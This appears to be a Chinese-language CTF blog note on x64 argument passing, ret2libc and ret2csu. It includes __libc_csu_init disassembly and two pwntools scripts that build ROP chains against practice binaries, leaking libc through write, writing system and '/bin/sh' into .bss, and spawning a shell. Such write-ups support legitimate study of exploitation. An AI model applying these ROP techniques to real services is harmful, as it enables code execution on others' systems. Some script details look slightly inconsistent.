
title:  Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)
categories: [CTF]
tags: [pwn]

---
最近,跟着ctf-wiki的进度,在研究64位下ret2csu,发现对之前的Ret2Libc在64位中的用法及64位的函数有些误解导致ret2csu卡了好久.故写文以记之.

<!-- more -->
### 64位函数参数传递方式

#### Linux x64

当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。例:

```
H(a, b, c, d, e, f);
a->%rdi, b->%rsi, c->%rdx, d->%rcx, e->%r8, f->%r9
call H
```

当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中(即和32位汇编一样)

```
H(a, b, c, d, e, f, g, h);
a->%rdi, b->%rsi, c->%rdx, d->%rcx, e->%r8, f->%r9
h->8(%esp)
g->(%esp)
call H
```

#### Win 64

与linux不同,win64中前4个参数总是放在寄存器中传递，剩余的参数则压入堆栈中这4个用于存放参数的寄存器分别是：存放整数参数的RCX，RDX，R8，R9；存放浮点数参数的XMM0，XMM1，XMM2，XMM3。

### Linux x64 ret2bilc

 文件地址:[64pwn](https://ctf.show/files/09e5e2ba25e8a2f92cfc989e422986e8/pwn?token=eyJ1c2VyX2lkIjo2MzUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjkyfQ.X4QfkQ.e-Di0pNDhoeRLXJkQc8otm-2bD8)

在做ctfshow pwn题时,发现有一道题用ret2text本地打得通远程打不通.故想用ret2bilc1的方法来获得shell.然后就踩了一个关于x64函数调用的坑。在Linux x64中，函数会先调用寄存器里面的，然后再调用栈里。（之前一直当成x32那样，把参数直接写在栈上所以失败了）

通过`ROPgadget --binary 64pwn --only 'pop|ret' `：

![image-20201012174336320](image-20201012174336320.png)

发现有直接操控第一个参数（rdi）的gadget。

通过`ROPgadget --binary 64pwn --string '/bin/sh' `：

![image-20201012175025107]( image-20201012175025107.png)

找到`/bin/sh`的地址。

```python
from pwn import *
from LibcSearcher import LibcSearcher

e=ELF('./64pwn')

context.terminal = ['tmux', 'splitw', '-h']

p=process('./64pwn')
gdb.attach(p,'b main')

pay = "a" *12+p64(0)+p64(0x0000400643)+p64(0x0000000000400664)+p64(e.plt['system'])+p64(e.plt['system'])
print(len("a" *12+p64(0)+ p64(e.symbols['getFlag'])))
print(hex(e.symbols['getFlag']))
p.sendline(pay)
p.interactive()
```

### Linux x64 ret2csu

由上面的题可以看见，我们不是每次都能同时控制 rdi, rsi, rdx, rcx, r8, r9这些传递参数的寄存器。因此我们可以,一些默认编译的函数中的 gadgets,来间接达到控制 rdi, rsi, rdx, rcx, r8, r9寄存器.

在一般的x64位程序，经常会编译以下函数：

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```

我们可以在这些函数里，去找有没有我们可以利用的gadgets。

以`__libc_csu_init`函数为例，`__libc_csu_init`的汇编代码如下

```cobol
.text:00000000004005E0
.text:00000000004005E0 ; void _libc_csu_init(void)
.text:00000000004005E0                 public __libc_csu_init
.text:00000000004005E0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005E0 ; __unwind {
.text:00000000004005E0                 push    r15
.text:00000000004005E2                 push    r14
.text:00000000004005E4                 mov     r15, rdx
.text:00000000004005E7                 push    r13
.text:00000000004005E9                 push    r12
.text:00000000004005EB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005F2                 push    rbp
.text:00000000004005F3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005FA                 push    rbx
.text:00000000004005FB                 mov     r13d, edi
.text:00000000004005FE                 mov     r14, rsi
.text:0000000000400601                 sub     rbp, r12
.text:0000000000400604                 sub     rsp, 8
.text:0000000000400608                 sar     rbp, 3
.text:000000000040060C                 call    _init_proc
.text:0000000000400611                 test    rbp, rbp
.text:0000000000400614                 jz      short loc_400636
.text:0000000000400616                 xor     ebx, ebx
.text:0000000000400618                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400620
.text:0000000000400620 loc_400620:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400620                 mov     rdx, r15
.text:0000000000400623                 mov     rsi, r14
.text:0000000000400626                 mov     edi, r13d
.text:0000000000400629                 call    qword ptr [r12+rbx*8]
.text:000000000040062D                 add     rbx, 1
.text:0000000000400631                 cmp     rbp, rbx
.text:0000000000400634                 jnz     short loc_400620
.text:0000000000400636
.text:0000000000400636 loc_400636:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400636                 add     rsp, 8
.text:000000000040063A                 pop     rbx
.text:000000000040063B                 pop     rbp
.text:000000000040063C                 pop     r12
.text:000000000040063E                 pop     r13
.text:0000000000400640                 pop     r14
.text:0000000000400642                 pop     r15
.text:0000000000400644                 retn
.text:0000000000400644 ; } // starts at 4005E0
.text:0000000000400644 __libc_csu_init endp
.text:0000000000400644
```

我们仔细观察可以发现在0x000000000040063A到0x0000000000400644的gadget可以让我们控制到rbx、rbp、r12、r13、r14、r15.而0x0000000000400620到0x0000000000400629的gadget我们可以让我们通过rbx、rbp、r12、r13、r14、r15寄存器可以让我们间接控制rdx、rsi、edi甚至在rbx、rbp合理的情况（rbx值为0，rbp为1）下可以让我们call一个函数。

#### leve5

以leve5为例来说，我们可以通过之前说的`__libc_csu_init`中的那两个gadget来控制一个来函数。先查看leve5属性.

![image-20201014161839287]( image-20201014161839287.png)

查看文件,发现没有命令执行函数与`/bin/sh`,要通过write出实际地址，计算偏移找libc。

同时，write要3个参数：write (int fd, const void * buf, size_t count)



```
----------------------------------
| 寄存器和指令 |      存储数据      | 
----------------------------------
|    rdi     |        1          | rdi存放第一参数，标准输出文件描述符：fd = 1
----------------------------------
|    rsi     |     write_got     | rsi存放第二参数，需要输出的内存地址：*buf = write_got
----------------------------------
|    rdx     |        8          | rdx存放第三参数，输出字节数：count = 8
----------------------------------
|    call    |     write_got     | call write_got调用write函数
----------------------------------
```

所以我们要rdi，rsi，rdx三个寄存器，因此我们可以用__libc_csu_init里的gadgets来控制rbx、rbp、r12、r13、r14、r15来间接控制 rdi, rsi, rdx。 ![image-20201014223603871]( image-20201014223603871.png)

同样的方式来调用read将shell写入，及调用写入的shell：

```python
from pwn import *
from LibcSearcher import LibcSearcher
import pwnlib

context.terminal = ['tmux', 'splitw', '-h']

p=process('./level5')

e=ELF('./level5')

bss_addr=0x601028  #e.bss()

# rbx rbp r12 r13 r14 r15 
def csu(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):
	pay='a'*buf+p64(0)
    pay=pay+p64(g1)+p64(0)
	pay=pay+p64(rbx)+p64(rbp)
	pay=pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    pay=pay+p64(g2)
	pay=pay+'\00'*0x38+p64(lest_cell)

	return pay



pay=csu(0x0000000000400606,0x0000000004005F0,0x80,0,1,e.got['write'],1,e.got['write'],8,e.symbols['main'])#write打印实际的地址



x=p.recvline()
print(x+'this one')


p.sendline(pay)
sleep(3)

puts_real=p.recv(8)

libc = LibcSearcher('write', u64(puts_real))
libcbase =u64(puts_real) - libc.dump('write')

system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
binsh="/bin/sh\n"
sleep(1)
pay=csu(0x0000000000400606,0x0000000004005F0,0x80,0,1,e.got['read'],0,bss_addr,16,e.symbols['main'])#read将sehll写入
print(p.recvline()+'this two')
#gdb.attach(p,'b main')

p.sendline(pay)
sleep(2)

p.send(p64(system_addr)+"/bin/sh\0")

print(len(p64(system_addr)+"/bin/sh\0"))
sleep(2)

pay=csu(0x0000000000400606,0x0000000004005F0,0x80,0,1,bss_addr,bss_addr+8,0,0,e.symbols['main'])#调用shell

sleep(2)
p.send(pay)
sleep(2)
print(p.recvline()+'this three')
#gdb.attach(p,'b main')

p.interactive()

```

这里要注意的是，第二个gadge后，会按正常执行顺序再次进入第一个gadge，这次栈顶提高了0x38，因此我们要加0x38字符填充。

![image-20201014200307178]( image-20201014200307178.png)









## 参考文献

https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-VI/Chapter-64.html

https://www.yuque.com/hxfqg9/bin/pqc1nq

